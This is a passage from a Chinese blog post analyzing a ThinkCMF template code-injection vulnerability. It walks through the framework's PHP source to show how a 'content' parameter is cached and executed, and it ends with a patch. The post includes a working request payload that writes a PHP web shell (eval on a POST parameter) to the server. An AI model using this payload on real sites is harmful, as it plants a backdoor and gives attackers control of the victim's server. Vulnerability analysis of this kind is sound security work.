<li>调用了Storage类的load静态方法，Storage其实没有这个方法，但存在__callstatic魔术方法<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__callstatic</span><span class="params">($method,$args)</span></span>&#123;</span><br><span class="line">       <span class="comment">//调用缓存驱动的方法</span></span><br><span class="line">       <span class="keyword">if</span>(method_exists(<span class="keyword">self</span>::$handler, $method))&#123;</span><br><span class="line">          <span class="keyword">return</span> call_user_func_array(<span class="keyword">array</span>(<span class="keyword">self</span>::$handler,$method), $args);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></li>
<li>这时$method 为load，也就是会去调用一个名叫load的方法</li>
<li>调试可以发现调用的是File类的load方法<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 加载文件</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $filename  文件名</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $vars  传入变量</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void        </span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">load</span><span class="params">($_filename,$vars=null)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!is_null($vars))&#123;</span><br><span class="line">            extract($vars, EXTR_OVERWRITE);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">include</span> $_filename;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li>
<li>在最后包含了我们指定的文件</li>
</ul>
<h3 id="2-fetch方法"><a href="#2-fetch方法" class="headerlink" title="2.fetch方法"></a>2.fetch方法</h3><p>这个时候payload为</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?a=fetch</span><br><span class="line">&amp;templateFile=<span class="keyword">public</span>/index</span><br><span class="line">&amp;prefix=<span class="string">''</span></span><br><span class="line">&amp;content=<span class="meta">&lt;?php</span> file_put_contents(<span class="string">'shell.php'</span>,<span class="string">'&lt;?php eval($_POST["pass"]);?&gt;'</span>) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以看到content参数中的php代码被执行了<br>分析下代码:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">fetch</span><span class="params">($templateFile=<span class="string">''</span>,$content=<span class="string">''</span>,$prefix=<span class="string">''</span>)</span></span>&#123;</span><br><span class="line">	    $templateFile = <span class="keyword">empty</span>($content)?<span class="keyword">$this</span>-&gt;parseTemplate($templateFile):<span class="string">''</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">parent</span>::fetch($templateFile,$content,$prefix);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>fetch也是调用了父类AppframeController的fetch方法<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">fetch</span><span class="params">($templateFile=<span class="string">''</span>,$content=<span class="string">''</span>,$prefix=<span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;view-&gt;fetch($templateFile,$content,$prefix);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></li>
<li>这个方法刚刚就见过<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">fetch</span><span class="params">($templateFile=<span class="string">''</span>,$content=<span class="string">''</span>,$prefix=<span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>($content)) &#123;</span><br><span class="line">            $templateFile   =   <span class="keyword">$this</span>-&gt;parseTemplate($templateFile);</span><br><span class="line">            <span class="comment">// 模板文件不存在直接返回</span></span><br><span class="line">            <span class="keyword">if</span>(!is_file($templateFile))</span><br><span class="line">                E(L(<span class="string">'_TEMPLATE_NOT_EXIST_'</span>) . <span class="string">':'</span> . $templateFile);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            defined(<span class="string">'THEME_PATH'</span>) <span class="keyword">or</span>    define(<span class="string">'THEME_PATH'</span>, <span class="keyword">$this</span>-&gt;getThemePath());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 页面缓存</span></span><br><span class="line">        ob_start();</span><br><span class="line">        ob_implicit_flush(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">'php'</span> == strtolower(C(<span class="string">'TMPL_ENGINE_TYPE'</span>))) &#123; <span class="comment">// 使用PHP原生模板</span></span><br><span class="line">            $_content   =   $content;</span><br><span class="line">            <span class="comment">// 模板阵列变量分解成为独立变量</span></span><br><span class="line">            extract(<span class="keyword">$this</span>-&gt;tVar, EXTR_OVERWRITE);</span><br><span class="line">            <span class="comment">// 直接载入PHP模板</span></span><br><span class="line">            <span class="keyword">empty</span>($_content)?<span class="keyword">include</span> $templateFile:<span class="keyword">eval</span>(<span class="string">'?&gt;'</span>.$_content);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">// 视图解析标签</span></span><br><span class="line">            $params = <span class="keyword">array</span>(<span class="string">'var'</span>=&gt;<span class="keyword">$this</span>-&gt;tVar,<span class="string">'file'</span>=&gt;$templateFile,<span class="string">'content'</span>=&gt;$content,<span class="string">'prefix'</span>=&gt;$prefix);</span><br><span class="line">            Hook::listen(<span class="string">'view_parse'</span>,$params);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 获取并清空缓存</span></span><br><span class="line">        $content = ob_get_clean();</span><br><span class="line">        <span class="comment">// 内容过滤标签</span></span><br><span class="line">        Hook::listen(<span class="string">'view_filter'</span>,$content);</span><br><span class="line">        <span class="comment">// 输出模板文件</span></span><br><span class="line">        <span class="keyword">return</span> $content;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li>
<li>代码同样会执行到<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hook::listen(<span class="string">'view_parse'</span>,$params);</span><br></pre></td></tr></table></figure></li>
<li>又是Hook类的静态方法listen<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 监听标签的插件</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $tag 标签名称</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> mixed $params 传入参数</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">listen</span><span class="params">($tag, &amp;$params=NULL)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">self</span>::$tags[$tag])) &#123;</span><br><span class="line">            <span class="keyword">if</span>(APP_DEBUG) &#123;</span><br><span class="line">                G($tag.<span class="string">'Start'</span>);</span><br><span class="line">                trace(<span class="string">'[ '</span>.$tag.<span class="string">' ] --START--'</span>,<span class="string">''</span>,<span class="string">'INFO'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="keyword">self</span>::$tags[$tag] <span class="keyword">as</span> $name) &#123;</span><br><span class="line">                APP_DEBUG &amp;&amp; G($name.<span class="string">'_start'</span>);</span><br><span class="line">                $result =   <span class="keyword">self</span>::exec($name, $tag,$params);</span><br><span class="line">                <span class="keyword">if</span>(APP_DEBUG)&#123;</span><br><span class="line">                    G($name.<span class="string">'_end'</span>);</span><br><span class="line">                    trace(<span class="string">'Run '</span>.$name.<span class="string">' [ RunTime:'</span>.G($name.<span class="string">'_start'</span>,$name.<span class="string">'_end'</span>,<span class="number">6</span>).<span class="string">'s ]'</span>,<span class="string">''</span>,<span class="string">'INFO'</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">false</span> === $result) &#123;</span><br><span class="line">                    <span class="comment">// 如果返回false 则中断插件执行</span></span><br><span class="line">                    <span class="keyword">return</span> ;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(APP_DEBUG) &#123; <span class="comment">// 记录行为的执行日志</span></span><br><span class="line">                trace(<span class="string">'[ '</span>.$tag.<span class="string">' ] --END-- [ RunTime:'</span>.G($tag.<span class="string">'Start'</span>,$tag.<span class="string">'End'</span>,<span class="number">6</span>).<span class="string">'s ]'</span>,<span class="string">''</span>,<span class="string">'INFO'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li>
<li>$content变为$params</li>
<li>跟进exec方法<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$result =   <span class="keyword">self</span>::exec($name, $tag,$params)</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span><span class="params">($name, $tag,&amp;$params=NULL)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">'Behavior'</span> == substr($name,<span class="number">-8</span>) )&#123;</span><br><span class="line">            <span class="comment">// 行为扩展必须用run入口方法</span></span><br><span class="line">        	$class = $name;</span><br><span class="line">            $tag    =   <span class="string">'run'</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        	$class   =  <span class="string">"plugins\\&#123;$name&#125;\\&#123;$name&#125;Plugin"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(class_exists($class))&#123; <span class="comment">//ThinkCMF NOTE 插件或者行为存在时才执行</span></span><br><span class="line">        	$addon   = <span class="keyword">new</span> $class();</span><br><span class="line">        	<span class="keyword">return</span> $addon-&gt;$tag($params);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li>
<li>最后一句<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> $addon-&gt;$tag($params);</span><br></pre></td></tr></table></figure>
调用Behavior\ParseTemplateBehavior类的run方法<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 行为扩展的执行入口必须是run</span></span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span><span class="params">(&amp;$_data)</span></span>&#123;</span><br><span class="line">       $engine             =   strtolower(C(<span class="string">'TMPL_ENGINE_TYPE'</span>));</span><br><span class="line">       $_content           =   <span class="keyword">empty</span>($_data[<span class="string">'content'</span>])?$_data[<span class="string">'file'</span>]:$_data[<span class="string">'content'</span>];</span><br><span class="line">       $_data[<span class="string">'prefix'</span>]    =   !<span class="keyword">empty</span>($_data[<span class="string">'prefix'</span>])?$_data[<span class="string">'prefix'</span>]:C(<span class="string">'TMPL_CACHE_PREFIX'</span>);</span><br><span class="line">       <span class="keyword">if</span>(<span class="string">'think'</span>==$engine)&#123; <span class="comment">// 采用Think模板引擎</span></span><br><span class="line">           <span class="keyword">if</span>((!<span class="keyword">empty</span>($_data[<span class="string">'content'</span>]) &amp;&amp; <span class="keyword">$this</span>-&gt;checkContentCache($_data[<span class="string">'content'</span>],$_data[<span class="string">'prefix'</span>])) </span><br><span class="line">               ||  <span class="keyword">$this</span>-&gt;checkCache($_data[<span class="string">'file'</span>],$_data[<span class="string">'prefix'</span>])) &#123; <span class="comment">// 缓存有效</span></span><br><span class="line">               <span class="comment">//载入模版缓存文件</span></span><br><span class="line">               Storage::load(C(<span class="string">'CACHE_PATH'</span>).$_data[<span class="string">'prefix'</span>].md5($_content).C(<span class="string">'TMPL_CACHFILE_SUFFIX'</span>),$_data[<span class="string">'var'</span>]);</span><br><span class="line">           &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">               $tpl = Think::instance(<span class="string">'Think\\Template'</span>);</span><br><span class="line">               <span class="comment">// 编译并加载模板文件</span></span><br><span class="line">               $tpl-&gt;fetch($_content,$_data[<span class="string">'var'</span>],$_data[<span class="string">'prefix'</span>]);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">           <span class="comment">// 调用第三方模板引擎解析和输出</span></span><br><span class="line">           <span class="keyword">if</span>(strpos($engine,<span class="string">'\\'</span>))&#123;</span><br><span class="line">               $class  =   $engine;</span><br><span class="line">           &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">               $class   =  <span class="string">'Think\\Template\\Driver\\'</span>.ucwords($engine);                </span><br><span class="line">           &#125;            </span><br><span class="line">           <span class="keyword">if</span>(class_exists($class)) &#123;</span><br><span class="line">               $tpl   =  <span class="keyword">new</span> $class;</span><br><span class="line">               $tpl-&gt;fetch($_content,$_data[<span class="string">'var'</span>]);</span><br><span class="line">           &#125;<span class="keyword">else</span> &#123;  <span class="comment">// 类没有定义</span></span><br><span class="line">               E(L(<span class="string">'_NOT_SUPPORT_'</span>).<span class="string">': '</span> . $class);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></li>
<li>这里分为两种情况<h4 id="1-第一次执行payload2，或者清除了ThinkCMF的缓存"><a href="#1-第一次执行payload2，或者清除了ThinkCMF的缓存" class="headerlink" title="1.第一次执行payload2，或者清除了ThinkCMF的缓存"></a>1.第一次执行payload2，或者清除了ThinkCMF的缓存</h4></li>
<li>会执行下面的代码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$tpl = Think::instance(<span class="string">'Think\\Template'</span>);</span><br><span class="line">               <span class="comment">// 编译并加载模板文件</span></span><br><span class="line">               $tpl-&gt;fetch($_content,$_data[<span class="string">'var'</span>],$_data[<span class="string">'prefix'</span>]);</span><br></pre></td></tr></table></figure></li>
<li>又是Think\Template类的fetch方法<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 加载模板</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $templateFile 模板文件</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array  $templateVar 模板变量</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $prefix 模板标识前缀</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">fetch</span><span class="params">($templateFile,$templateVar,$prefix=<span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;tVar         =   $templateVar;</span><br><span class="line">        $templateCacheFile  =   <span class="keyword">$this</span>-&gt;loadTemplate($templateFile,$prefix);</span><br><span class="line">        Storage::load($templateCacheFile,<span class="keyword">$this</span>-&gt;tVar,<span class="keyword">null</span>,<span class="string">'tpl'</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li>
<li>跟进loadTemplate方法<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 加载主模板并缓存</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $templateFile 模板文件</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $prefix 模板标识前缀</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> ThinkExecption</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loadTemplate</span> <span class="params">($templateFile,$prefix=<span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file($templateFile)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;templateFile    =  $templateFile;</span><br><span class="line">            <span class="comment">// 读取模板文件内容</span></span><br><span class="line">            $tmplContent =  file_get_contents($templateFile);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $tmplContent =  $templateFile;</span><br><span class="line">        &#125;</span><br><span class="line">         <span class="comment">// 根据模版文件名定位缓存文件</span></span><br><span class="line">        $tmplCacheFile = <span class="keyword">$this</span>-&gt;config[<span class="string">'cache_path'</span>].$prefix.md5($templateFile).<span class="keyword">$this</span>-&gt;config[<span class="string">'cache_suffix'</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 判断是否启用布局</span></span><br><span class="line">        <span class="keyword">if</span>(C(<span class="string">'LAYOUT_ON'</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">false</span> !== strpos($tmplContent,<span class="string">'&#123;__NOLAYOUT__&#125;'</span>)) &#123; <span class="comment">// 可以单独定义不使用布局</span></span><br><span class="line">                $tmplContent = str_replace(<span class="string">'&#123;__NOLAYOUT__&#125;'</span>,<span class="string">''</span>,$tmplContent);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123; <span class="comment">// 替换布局的主体内容</span></span><br><span class="line">                $layoutFile  =  THEME_PATH.C(<span class="string">'LAYOUT_NAME'</span>).<span class="keyword">$this</span>-&gt;config[<span class="string">'template_suffix'</span>];</span><br><span class="line">                <span class="comment">// 检查布局文件</span></span><br><span class="line">                <span class="keyword">if</span>(!is_file($layoutFile)) &#123;</span><br><span class="line">                    E(L(<span class="string">'_TEMPLATE_NOT_EXIST_'</span>).<span class="string">':'</span>.$layoutFile);</span><br><span class="line">                &#125;</span><br><span class="line">                $tmplContent = str_replace(<span class="keyword">$this</span>-&gt;config[<span class="string">'layout_item'</span>],$tmplContent,file_get_contents($layoutFile));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 编译模板内容</span></span><br><span class="line">        $tmplContent =  <span class="keyword">$this</span>-&gt;compiler($tmplContent);</span><br><span class="line">        Storage::put($tmplCacheFile,trim($tmplContent),<span class="string">'tpl'</span>);</span><br><span class="line">        <span class="keyword">return</span> $tmplCacheFile;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li>
<li>发现在最后调用了了Storage类的put方法，也就是调用了File类的put方法<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 文件写入</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $filename  文件名</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $content  文件内容</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> boolean         </span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">put</span><span class="params">($filename,$content,$type=<span class="string">''</span>)</span></span>&#123;</span><br><span class="line">        $dir         =  dirname($filename);</span><br><span class="line">        <span class="keyword">if</span>(!is_dir($dir))&#123;</span><br><span class="line">            mkdir($dir,<span class="number">0777</span>,<span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">false</span> === file_put_contents($filename,$content))&#123;</span><br><span class="line">            E(L(<span class="string">'_STORAGE_WRITE_ERROR_'</span>).<span class="string">':'</span>.$filename);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;contents[$filename]=$content;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li>
<li>可以看到我们指定的content被写入到了一个缓存文件中去，文件名为之前的<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C(<span class="string">'CACHE_PATH'</span>).$prefix.md5($tmplContent).C(<span class="string">'TMPL_CACHFILE_SUFFIX'</span>)</span><br></pre></td></tr></table></figure></li>
<li>然后Think\Template类fetch方法最后一行会调用File类的load方法去包含这个缓存文件，达到代码注入的效果</li>
</ul>
<h4 id="2-之前执行了payload2-缓存文件已经存在"><a href="#2-之前执行了payload2-缓存文件已经存在" class="headerlink" title="2.之前执行了payload2,缓存文件已经存在"></a>2.之前执行了payload2,缓存文件已经存在</h4><ul>
<li>会用checkContentCache方法会检查缓存是否已经存在<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 检查缓存内容是否有效</span></span><br><span class="line"><span class="comment">     * 如果无效则需要重新编译</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $tmplContent  模板内容</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> boolean</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">checkContentCache</span><span class="params">($tmplContent,$prefix=<span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(Storage::has(C(<span class="string">'CACHE_PATH'</span>).$prefix.md5($tmplContent).C(<span class="string">'TMPL_CACHFILE_SUFFIX'</span>)))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>和刚才一样会去调用Storage类的has方法，实际上会调用File类的has方法去判断缓存文件是否存在<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 文件是否存在</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $filename  文件名</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> boolean     </span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">has</span><span class="params">($filename,$type=<span class="string">''</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> is_file($filename);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li>
<li>如果缓存文件存在的话(比如之前已经执行过payload2),则直接去用load方法去包含这个缓存文件</li>
</ul>
<h2 id="修补方法"><a href="#修补方法" class="headerlink" title="修补方法"></a>修补方法</h2><p>把display和fetch方法从public变为protected</p>

  </div>
  <div class="post-meta">
    <span class="post-time" style="color:#646060;font-size:13px">2019-11-04</span>
  </div>

  <div class="post-footer">
    
      <ul class="post-tag-list" itemprop="keywords"><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag">漏洞分析</a></li></ul>
    

    <a href="#top" class="top">Back to Top</a>
  </div>
</article>

<!-- 评论插件 -->

<footer>
  2025
  <span class="author">
    LionTree
  </span>
</footer>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

    </div>
  </body>
</html>